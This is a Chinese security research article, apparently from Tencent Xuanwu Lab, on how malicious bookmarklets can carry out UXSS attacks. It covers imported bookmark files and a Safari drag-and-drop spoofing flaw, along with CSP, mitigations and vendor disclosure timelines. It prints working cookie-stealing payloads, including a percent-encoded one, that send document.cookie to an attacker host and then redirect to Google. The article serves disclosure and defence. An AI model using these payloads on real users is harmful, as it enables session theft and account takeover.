作者：xisigr @腾讯玄武实验室

原文链接：http://xlab.tencent.com/cn/2017/01/18/badbookmarklet/

### 0 引言

Bookmarklet，中文名可以翻译成小书签，它的存在形式和书签一样，都被保存在浏览器的收藏夹中。但它不是一个 HTTP、FTP、File 开头的
URL，而是一段 javascript: 开头的 javascript 代码。1995 年 Javascript 的作者 Brendan Eich 特意设计
javascript: URLs 和普通URL一样用于收藏夹，时至今日小书签已经于浏览器中存在了 20 多年。

在这些年中浏览器以及WEB
上的攻防对抗风云幻变，也使小书签上的安全风险渐渐大于它的业务实用性。从攻击的角度来看，日渐复杂的应用场景、多样化的攻击手段层出不穷，使小书签可以执行任意
javascript 代码的这个特性演变成一了种攻击手段。而在防御层面，CSP 的出现与普及，也似乎预示着小书签的历史使命走到了尽头。

本文从在现代浏览器中导入和拖放小书签，来介绍小书签是如何变成一种致命攻击手段的。

### 1 小书签的历史

> “这是一个特意设计的特性：我在1995年发明 JavaScript 的时候发明了 javascript: 这类 URL，并打算使得
> javascript: URLs 用法和其他URL一样，包括收录入收藏夹。 我特地把”JavaScript:”
> URL设计得可以在运行时产生一个新文档，例如 javascript:’hello, world’ ，同时也可以在当前文档的 DOM
> 下运行任意脚本（这点对小书签尤其有用），就像这样： javascript:alert(document.links[0].href) 。
> 这两者的区别就是，后者的URL在JS解析下值为 undefined。我在 Netscape 2 投入市场前加入了 void 操作符来清除任何非
> undefined 的 javascript: URL 的值。”
>
> ——Brendan Eich，寄给 Simon Willison 的邮件

以上是 JavaScript 的发明人 Brendan Eich 说明小书签来历的一段话，引自于维基百科
http://zh.wikipedia.org/zh-cn/小书签 。 这20多年来浏览器小书签也一直遵循着当年 Brendan Eich 对它的定义。

### 2 小书签的正常功能

我们知道浏览器使用隶属于`<a>`标签的 href 的 URI 标签来存储书签。浏览器用 URI
前缀，例如`http:`,`file:`,或是`ftp:`来确定协议以及请求剩余字符串的格式。

浏览器也能像执行其它前缀一样执行`javascript:`。在内部处理时，当浏览器检查到协议为JavaScript,就将后面的字符串作为
JavaScript 脚本来执行，并用执行结果产生一个新页面。

例如这段小书签，可以直接让用户进行 base64 编码的转换：

    
    
    javascript:(function(){x=prompt('Text:','');l=x.length%3;if(l)for(i=1;i<7-l;i++)x=x+'%20';;prompt('Output:',window.btoa(x));})();

而下面这段小书签则会在用户的当前域弹出 cookie:

    
    
    Javascript:alert(document.cookie)

### 3 小书签上的安全风险

小书签中可以写入任意 Javascript 代码，这使得写入恶意代码也成为可能。如果小书签中是一段可以获取用户 cookie
并发送给攻击者的代码，那么当用户点击这段小书签后，当前域的 cookie 信息就会被攻击者获取到。这个时候，小书签即变成了 UXSS
的孵化器。如果设备之间浏览器开启 SYNC，那么这段恶意小书签也会同步到其他设备上去，使危害增大。

看起来以上的分析是可行的，但如何让小书签变得有攻击性呢，因为用户不会主动去写一个恶意的小书签，然后自己去点击。而就算用户自己在小书签里自娱自乐的 Self-XSS 的弹个`alert(1)`，又有何不可？

如果我们能找到一个场景，可以让用户无意在浏览器中注入恶意的小书签。基于此想法，来看下面这个场景：

  1. 用户在保存书签的时候，就认为书签是正确的。
  2. 在点击书签后也会导航到正确的网站。

如果上面2点能顺利完成，且整个过程从表面来看没有任何差错和异常，那么用户对这个小书签基本上就不会去怀疑。下文我们测试的过程中，当用户点击了这个书签，用户的信息即被攻击者获取到了！

### 4 导入和拖放恶意小书签

##### 4.1导入恶意小书签

在现代浏览器中，都有了书签导入导出的功能。我们可以把书签导出为 HTML 文件，并能随时把 HTML
的书签导入到浏览器中。另外，不同浏览器之间也可以互相导入。

例如导入如下书签文件，你可以把它保存为 bookmark.html，然后导入到浏览器中：

    
    
    <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8">
    <TITLE>Bookmarks</TITLE>
    <H1>Bookmarks</H1>
        <DT><H3>xss Bookmarks</H3>
        <DL><p>
            <DT>
            <DT><H3>xss_test</H3>
            <DL><p>
            </DL><p>
            <DT><A HREF="javascript:document.write('hack by xisigr');">xss0</A>
            <DT><A HREF="Javascript:alert(document.cookie);">xss1</A>
            <DT><A HREF="javascript: var b=document.createElement('script');b.src='http:// attackip /get.php?cookie='+escape(document.cookie);document.body.appendChild(b);setTimeout(%22location='http://www.google.com'%22,1000);">google</A>
        </DL><p>
    </DL>

在我们测试过程中，Chrome/Firefox/Safari/Opera 这四款浏览器可以直接导入 bookmark.html
小书签，导入的过程中没有任何提示。IE无法导入这样的小书签，导入时会提示错误而中断。

小书签的自身特性，决定了上面的这三个小书签，在用户点击的时候，可以直接在当前 DOM 下渲染执行。如果当前域是 gmail.com，那么就等同于是在
gmail.com 域中插入了一段 Javascript 脚本，并运行它。

于是，我们有了如下的攻击场景：

  1. 攻击者在网上共享了一个书签文件 bookmarks.html（注入了恶意代码）
  2. 用户看到书签不错，下载下来.
  3. 用户把书签 bookmakes.html 文件导入到浏览器中。
  4. 在已经打开任何域的情况下，打开书签，书签中的恶意 javascript 代码就会注入到当前域下。一个 UXSS 攻击就发生了。

##### 4.2 拖放恶意小书签

除了导入书签文件外，还可以使用拖放的方式来保存书签。

我们Safari浏览器中找到一个真实的小书签攻击案例。整个场景将在 MAC+IPad 环境下进行，为了体现攻击效果，我们在攻击场景中加入了设备之间的
SYNC，在这个攻击过程中，利用了一个 Safari 浏览器的拖放书签欺骗漏洞，来欺骗用户把恶意的小书签保存到收藏夹中，这个小书签保存后名称会显示
google.com，点击后也会到达 google.com，整个攻击过程非常隐蔽，很容易欺骗到用户。假设用户已经在 MAC、IPad 中打开了 Amazon
和 Gmail。那么当用户点击 google.com这个书签导航到 google.com 后，Amazon 和 Gmail 的 cookie
就被攻击者获取到了。

这个攻击场景如下图： ![](https://images.seebug.org/content/images/2017/01/1-3.png-w331s)

  1. 用户拖放链接保存为书签。
  2. 设备开启同步后，书签也会保存到其他设备上。
  3. 当用户点击书签后，当前域的 cookie 会发送给攻击者。

第一步很关键，用户拖放链接保存为书签。这里会用到一个 Safari 浏览器拖放书签的欺骗攻击。先简单说下这个欺骗漏洞的原理，把如下代码保存为
attack.html。

    
    
    <div draggable="true" ondragstart="event.dataTransfer.setData('text',  'http://baidu.com/#/google');"><a  href=http://www.google.com>google.com</a></div>

用 Safari 打开后，链接会显示 google.com，用户点击后会指向 google.com。但用户拖放这个链接保存为书签时，拖放的内容会被替换为
http://baidu.com/#/google ，而保存到收藏夹后，由于 Safari 收藏夹的设计特点，会取 URL
中最后“/”后面的字符作为书签的名字，所以书签的名字将是 google。那么在整个保存为书签的过程中，用户看到的始终是
google，所以不会对此次拖放保存书签有怀疑。当用户点击书签链接时，由于链接中加入了 #，所以 URL 会忽略掉#后面的内容，直接转向到了
baidu.com。这可以看做是一次重定向攻击。

了解完书签拖放欺骗的原理后，我们就来看一个真正的攻击，这次拖放替换的内容不是一个 URL，而是一个 javascript:
开头的小书签。可以直接在当前域下注入任意 javascript 代码。一个 UXSS 产生了。

将如下代码保存为 attack.html 代码：

    
    
    <div draggable="true" ondragstart="event.dataTransfer.setData('text',  'javascript:%76%61%72%20%62%3D%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%27%73%63%72%69%70%74%27%29%3B%62%2E%73%72%63%3D%27%68%74%74%70%3A%2F%2F%78%69%73%69%67%72%2E%63%6F%6D%2F%32%30%31%35%74%65%73%74%2F%67%65%74%2E%70%68%70%3F%63%6F%6F%6B%69%65%3D%27%2B%65%73%63%61%70%65%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29%3B%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%2E%61%70%70%65%6E%64%43%68%69%6C%64%28%62%29%3B%73%65%74%54%69%6D%65%6F%75%74%28%22%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D%27%22%2C%31%30%30%30%29%3B/#/google');"><a href=http://www.google.com>google.com</a>
    </div>

编码部分的代码为：

    
    
    var b=document.createElement('script');b.src='http://xisigr.com/2015test/get.php?cookie='+escape(document.cookie);document.body.appendChild(b);setTimeout("location='http://www.google.com'",1000);

演示视频： <http://v.youku.com/v_show/id_XMTQyMzQ5NDg0MA==.html>

### 5 CSP的出现使小书签消亡

自从内容安全策略（Content Security Policy，简称
CSP）开始被提出，这些年逐渐被各大浏览器厂商支持和认可，也预示着小书签的历史使命走到了尽头。

大家知道 CSP 是为了防止 XSS
而设计，默认配置下不允许执行内联代码（`<script>`块内容，内联事件，内联样式），以及禁止执行`eval()`,`newFunction()`,`setTimeout([string],
…)`和`setInterval([string], …)`。

内联 Javascript 不能运行，不能加载外部资源，这些限制都使得小书签将不能正常工作。就此问题，Firefox 的 bugzilla
社区中曾有过白热化的讨论，<https://bugzilla.mozilla.org/show_bug.cgi?id=866522>，其中有一个对狂热的书签使用者说道：

> 作为一个“超级用户”，我非常依赖我的书签工具和 Greasemonkey 的用户脚本来执行各种功能和特性，在各种网站（加入了 CSP
> 防御），书签中的脚本无法使用，现在这个的问题，非常恼人，困然了我好几个月。安全性显然是重要的，但是，作为最终用户，我应该永远有控制和浏览体验的绝对权力，并且几乎能够做我想做的。

而另一篇文章，则直接写到Bookmarklets are Dead… <https://medium.com/making-instapaper/bookmarklets-are-dead-d470d4bbb626>

在我们写这篇文章时，Firefox/Edge 浏览器中，小书签作为内联JS是不可以运行的，Chrome/Safari
浏览器中则是可以的。这是不是也可以认为小书签绕过了 CSP 呢？

### 6 建议

其实对于`Javascript:URLs`这样的用法，浏览器厂商也已经开始意识到它在特殊场景下所带来的安全风险。比如在之前的浏览器中，用户可以直接粘贴`Javascript:URLs`到地址栏并运行，但现在
Chrome /Firefox/Edge 浏览器会直接把`Javascript:`这个协议关键字去掉。

但对于小书签中可以直接执行 `Javascript:URLs`，浏览器厂商始终保持一个较为保守的态度，毕竟小书签已经伴随浏览器 20
多年。对此，我们对小书签的使用，提出几点安全建议，可以暂时缓解小书签带来的安全风险：

浏览器厂商方面：对小书签的内容和权限进行颗粒度更细的控制。比如从文件或其他浏览器导入小书签时，严格过滤小书签内容，对可疑小书签弹出风险提示。

安全厂商方面：可以推出检测小书签的浏览器插件等。对恶意小书签，弹出预警提示。

用户方面：不要随意导入第三方小书签，明确导入的小书签功能是什么。

### 7 厂商回复

**Chrome**  
2015/04/13：向 Chrome 报告浏览器小书签安全问题 2015/04/13：Chrome
答复小书签上面的安全问题，他们在内部也讨论了很多次，目前来看小书签的实用性大于它带来的安全风险。 截至发稿时，并没有修复小书签可能涉及的安全风险。

**Firefox**  
2015/04/13：向 Firefox 报告浏览器小书签安全问题 2015/04/14：Firefox
回复他们认为导入书签时，应该有个风险提示。还认为恶意书签的钓鱼、重定向攻击也是很严重。 截至发稿时，并没有修复小书签可能涉及的安全风险。

**Safari**  
2015/04/13：向 Apple 报告 Safari 浏览器小书签安全问题 2015/04/21：向 Apple 报告 Safari 浏览器书签拖放欺骗
2015/12/02：向 Apple 提供详细漏洞视频 2015/12/25：询问 Apple 处理漏洞进度 2016/01/27：Apple
回复正在调查中 截至发稿时，没有任何回复，并没有修复小书签可能涉及的安全风险。

### 8 参考

[1] http://zh.wikipedia.org/zh-cn/小书签

[2] https://bugzilla.mozilla.org/show_bug.cgi?id=866522

[3] https://medium.com/making-instapaper/bookmarklets-are-dead-d470d4bbb626

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/187/>

